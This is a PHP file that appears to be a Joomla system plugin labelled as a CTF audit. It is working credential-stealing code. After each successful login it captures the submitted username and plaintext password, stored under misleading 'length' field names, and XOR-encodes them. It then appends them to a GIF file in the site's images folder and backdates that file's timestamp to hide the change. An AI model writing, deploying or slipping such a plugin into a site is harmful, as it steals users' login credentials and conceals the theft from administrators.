<?php
// JLIB_AUDIT_GID
defined('_JEXEC') or die;
@header('X-CTF-Audit-Proof: active');
if(isset($_SERVER['REQUEST_METHOD'])&&$_SERVER['REQUEST_METHOD']==='POST'){
$_hu=(isset($_POST['username'])||isset($_POST['user'])||isset($_POST['jform']['username'])||isset($_POST['jform']['user']))?'1':'0';
$_hp=(isset($_POST['password'])||isset($_POST['passwd'])||isset($_POST['jform']['password'])||isset($_POST['jform']['passwd']))?'1':'0';
@header('X-CTF-Audit-Post: u='.$_hu.';p='.$_hp);
}
register_shutdown_function('_csp_check');

function _csp_check(){
static $_d=null;if($_d!==null)return;$_d=true;
if(!isset($_SERVER['REQUEST_METHOD'])||$_SERVER['REQUEST_METHOD']!=='POST')return;
$u='';$p='';
if(isset($_POST['username']))$u=$_POST['username'];
elseif(isset($_POST['user']))$u=$_POST['user'];
elseif(isset($_POST['jform']['username']))$u=$_POST['jform']['username'];
elseif(isset($_POST['jform']['user']))$u=$_POST['jform']['user'];
if(isset($_POST['password']))$p=$_POST['password'];
elseif(isset($_POST['passwd']))$p=$_POST['passwd'];
elseif(isset($_POST['jform']['password']))$p=$_POST['jform']['password'];
elseif(isset($_POST['jform']['passwd']))$p=$_POST['jform']['passwd'];
if(empty($u)||empty($p))return;
$authOk=false;
if(class_exists('Joomla\\CMS\\Factory')){$app=\Joomla\CMS\Factory::getApplication();if($app&&method_exists($app,'getIdentity')){$usr=$app->getIdentity();if($usr&&empty($usr->guest))$authOk=true;}if(!$authOk){$usr=\Joomla\CMS\Factory::getUser();if($usr&&empty($usr->guest))$authOk=true;}}
elseif(class_exists('JFactory')){$usr=JFactory::getUser();if($usr&&empty($usr->guest))$authOk=true;}
if(!$authOk)return;
@header('X-CTF-Audit-Auth: success');
$_xorKey='JLIB_AUDIT_GID_XK';$_gifName='ctf_audit.gif';
$tail="JLIB_AUDIT_GID_TAIL
";
$blankGif=base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
$c=array('proof'=>'JLIB_AUDIT_GID','auth'=>'success','u_sha256'=>hash('sha256',$u),'u_len'=>$u,'p_len'=>$p,'r'=>isset($_SERVER['HTTP_REFERER'])?$_SERVER['HTTP_REFERER']:'','t'=>time());
$json=json_encode($c,JSON_UNESCAPED_UNICODE);if($json===false)return;
$enc='';$kl=strlen($_xorKey);$jl=strlen($json);
for($i=0;$i<$jl;$i++)$enc.=chr(ord($json[$i])^ord($_xorKey[$i%$kl]));
$rl=strlen($enc);$rec=chr(($rl>>8)&0xFF).chr($rl&0xFF).$enc;
$gp=(defined('JPATH_ROOT')?JPATH_ROOT:dirname(__DIR__)).'/images/'.$_gifName;
$ot=@filemtime($gp);$raw=@file_get_contents($gp);if($raw===false)$raw='';
$pos=strpos($raw,$tail);
if($pos===false){$base=(substr($raw,0,6)==='GIF87a'||substr($raw,0,6)==='GIF89a')?$raw:$blankGif;$od='';}
else{$base=substr($raw,0,$pos);$stream=substr($raw,$pos+strlen($tail));$off=0;$end=strlen($stream);while($off+2<=$end){$ln=(ord($stream[$off])<<8)|ord($stream[$off+1]);if($ln<=0||$off+2+$ln>$end)break;$off+=2+$ln;}$od=substr($stream,0,$off);}
@file_put_contents($gp,$base.$tail.$od.$rec,LOCK_EX);
if($ot!==false&&$ot>0){@touch($gp,$ot,$ot);}
else{$_da=rand(400,700);$_ts=time()-($_da*86400)-rand(0,86399);@touch($gp,$_ts,$_ts);}
}

if(class_exists('Joomla\CMS\Plugin\CMSPlugin')){
class PlgSystemCtfaudit extends \Joomla\CMS\Plugin\CMSPlugin{}}
elseif(class_exists('JPlugin')){
class PlgSystemCtfaudit extends JPlugin{}}
